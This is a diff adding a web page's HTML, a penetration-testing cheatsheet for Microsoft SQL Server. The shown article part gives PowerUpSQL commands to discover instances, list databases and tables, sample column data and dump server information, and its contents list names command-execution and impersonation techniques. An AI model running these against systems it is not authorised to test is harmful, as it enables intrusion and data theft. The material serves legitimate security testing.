@@ -1,0 +1,2224 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Tips, tricks, techniques and methodologies for pentesting MSSQL Server">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Pentesting MSSQL Server Cheatsheet" />
+<meta property="og:description" content="Tips, tricks, techniques and methodologies for pentesting MSSQL Server" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/mssql_server_cheatsheet/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-11-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-03T00:00:00+00:00" />
+<title>Pentesting MSSQL Server Cheatsheet | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="active">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Pentesting MSSQL Server Cheatsheet</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#mssql-server">MSSQL Server</a>
+      <ul>
+        <li><a href="#identify-instances-and-databases">Identify Instances and Databases</a>
+          <ul>
+            <li><a href="#discover-local-sql-server-instances">Discover Local SQL Server Instances</a></li>
+            <li><a href="#discover-domain-sql-server-instances">Discover Domain SQL Server Instances</a></li>
+            <li><a href="#discover-remote-sql-server-instances">Discover Remote SQL Server Instances</a></li>
+            <li><a href="#identify-encrypted-databases">Identify Encrypted databases</a></li>
+            <li><a href="#version-query">Version Query</a></li>
+          </ul>
+        </li>
+        <li><a href="#identify-sensitive-information">Identify Sensitive Information</a>
+          <ul>
+            <li><a href="#get-tables-from-a-specific-database">Get Tables from a Specific Database</a></li>
+            <li><a href="#gather-5-entries-from-each-column">Gather 5 Entries from Each Column</a></li>
+            <li><a href="#gather-5-entries-from-a-specific-table">Gather 5 Entries from a Specific Table</a></li>
+            <li><a href="#dump-common-information-from-server-to-files">Dump common information from server to files</a></li>
+          </ul>
+        </li>
+        <li><a href="#linked-database">Linked Database</a>
+          <ul>
+            <li><a href="#find-trusted-link">Find Trusted Link</a></li>
+            <li><a href="#execute-query-through-the-link">Execute Query Through The Link</a></li>
+            <li><a href="#crawl-links-for-instances-in-the-domain">Crawl Links for Instances in the Domain</a></li>
+            <li><a href="#crawl-links-for-a-specific-instance">Crawl Links for a Specific Instance</a></li>
+            <li><a href="#query-version-of-linked-database">Query Version of Linked Database</a></li>
+            <li><a href="#execute-procedure-on-linked-database">Execute Procedure on Linked Database</a></li>
+            <li><a href="#determine-names-of-linked-databases">Determine Names of Linked Databases</a></li>
+            <li><a href="#determine-all-the-tables-names-from-a-selected-linked-database">Determine All the Tables Names from a Selected Linked Database</a></li>
+            <li><a href="#gather-the-top-5-columns-from-a-selected-linked-table">Gather the Top 5 Columns from a Selected Linked Table</a></li>
+            <li><a href="#gather-entries-from-a-selected-linked-column">Gather Entries from a Selected Linked Column</a></li>
+          </ul>
+        </li>
+        <li><a href="#command-execution-via-xp_cmdshell">Command Execution via xp_cmdshell</a></li>
+        <li><a href="#extended-stored-procedure">Extended Stored Procedure</a>
+          <ul>
+            <li><a href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures">Add the extended stored procedure and list extended stored procedures</a></li>
+          </ul>
+        </li>
+        <li><a href="#clr-assemblies">CLR Assemblies</a>
+          <ul>
+            <li><a href="#execute-commands-using-clr-assembly">Execute commands using CLR assembly</a></li>
+            <li><a href="#manually-creating-a-clr-dll-and-importing-it">Manually creating a CLR DLL and importing it</a></li>
+          </ul>
+        </li>
+        <li><a href="#ole-automation">OLE Automation</a>
+          <ul>
+            <li><a href="#execute-commands-using-ole-automation-procedures">Execute commands using OLE automation procedures</a></li>
+          </ul>
+        </li>
+        <li><a href="#agent-jobs">Agent Jobs</a>
+          <ul>
+            <li><a href="#execute-commands-through-sql-agent-job-service">Execute commands through SQL Agent Job service</a></li>
+            <li><a href="#list-all-jobs">List All Jobs</a></li>
+          </ul>
+        </li>
+        <li><a href="#external-scripts">External Scripts</a></li>
+        <li><a href="#python">Python:</a></li>
+        <li><a href="#r">R</a></li>
+        <li><a href="#audit-checks">Audit Checks</a>
+          <ul>
+            <li><a href="#find-and-exploit-impersonation-opportunities">Find and exploit impersonation opportunities</a></li>
+          </ul>
+        </li>
+        <li><a href="#find-databases-that-have-been-configured-as-trustworthy">Find databases that have been configured as trustworthy</a></li>
+        <li><a href="#manual-sql-server-queries">Manual SQL Server Queries</a>
+          <ul>
+            <li><a href="#query-current-user--determine-if-the-user-is-a-sysadmin">Query Current User &amp; determine if the user is a sysadmin</a></li>
+            <li><a href="#current-role">Current Role</a></li>
+            <li><a href="#current-db">Current DB</a></li>
+            <li><a href="#list-all-tables">List all tables</a></li>
+            <li><a href="#list-all-databases">List all databases</a></li>
+            <li><a href="#all-logins-on-server">All Logins on Server</a></li>
+            <li><a href="#all-database-users-for-a-database">All Database Users for a Database</a></li>
+            <li><a href="#list-all-sysadmins">List All Sysadmins</a></li>
+            <li><a href="#list-all-database-roles">List All Database Roles</a></li>
+            <li><a href="#effective-permissions-from-the-server">Effective Permissions from the Server</a></li>
+            <li><a href="#effective-permissions-from-the-database">Effective Permissions from the Database</a></li>
+            <li><a href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database">Find SQL Server Logins Which can be Impersonated for the Current Database</a></li>
+            <li><a href="#exploiting-impersonation">Exploiting Impersonation</a></li>
+            <li><a href="#exploiting-nested-impersonation">Exploiting Nested Impersonation</a></li>
+            <li><a href="#mssql-accounts-and-hashes">MSSQL Accounts and Hashes</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="mssql-server">
+  MSSQL Server
+  <a class="anchor" href="#mssql-server">#</a>
+</h1>
+<h2 id="identify-instances-and-databases">
+  Identify Instances and Databases
+  <a class="anchor" href="#identify-instances-and-databases">#</a>
+</h2>
+<h3 id="discover-local-sql-server-instances">
+  Discover Local SQL Server Instances
+  <a class="anchor" href="#discover-local-sql-server-instances">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceLocal
+</span></span></code></pre></div><h3 id="discover-domain-sql-server-instances">
+  Discover Domain SQL Server Instances
+  <a class="anchor" href="#discover-domain-sql-server-instances">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain -Verbose
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get Server Info for Found Instances</span>
+</span></span><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get Database Names</span>
+</span></span><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults
+</span></span></code></pre></div><h3 id="discover-remote-sql-server-instances">
+  Discover Remote SQL Server Instances
+  <a class="anchor" href="#discover-remote-sql-server-instances">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceBroadcast -Verbose
+</span></span><span style="display:flex;"><span>Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1
+</span></span></code></pre></div><h3 id="identify-encrypted-databases">
+  Identify Encrypted databases
+  <a class="anchor" href="#identify-encrypted-databases">#</a>
+</h3>
+<p>Note: These are automatically decrypted for admins</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLDatabase -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Verbose | Where-Object {$_.is_encrypted <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;True&#34;</span>}
+</span></span></code></pre></div><h3 id="version-query">
+  Version Query
+  <a class="anchor" href="#version-query">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-Query <span style="color:#e6db74">&#34;select @@version&#34;</span>
+</span></span></code></pre></div><h2 id="identify-sensitive-information">
+  Identify Sensitive Information
+  <a class="anchor" href="#identify-sensitive-information">#</a>
+</h2>
+<h3 id="get-tables-from-a-specific-database">
+  Get Tables from a Specific Database
+  <a class="anchor" href="#get-tables-from-a-specific-database">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults
+</span></span><span style="display:flex;"><span>Get Column Details from a Table
+</span></span><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt;
+</span></span></code></pre></div><h3 id="gather-5-entries-from-each-column">
+  Gather 5 Entries from Each Column
+  <a class="anchor" href="#gather-5-entries-from-each-column">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords <span style="color:#e6db74">&#34;&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;&#34;</span> -Verbose -SampleSize <span style="color:#ae81ff">5</span>
+</span></span></code></pre></div><h3 id="gather-5-entries-from-a-specific-table">
+  Gather 5 Entries from a Specific Table
+  <a class="anchor" href="#gather-5-entries-from-a-specific-table">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#39;select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;&#39;</span>
+</span></span></code></pre></div><h3 id="dump-common-information-from-server-to-files">
+  Dump common information from server to files
+  <a class="anchor" href="#dump-common-information-from-server-to-files">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv
+</span></span></code></pre></div><h2 id="linked-database">
+  Linked Database
+  <a class="anchor" href="#linked-database">#</a>
+</h2>
+<h3 id="find-trusted-link">
+  Find Trusted Link
+  <a class="anchor" href="#find-trusted-link">#</a>
+</h3>
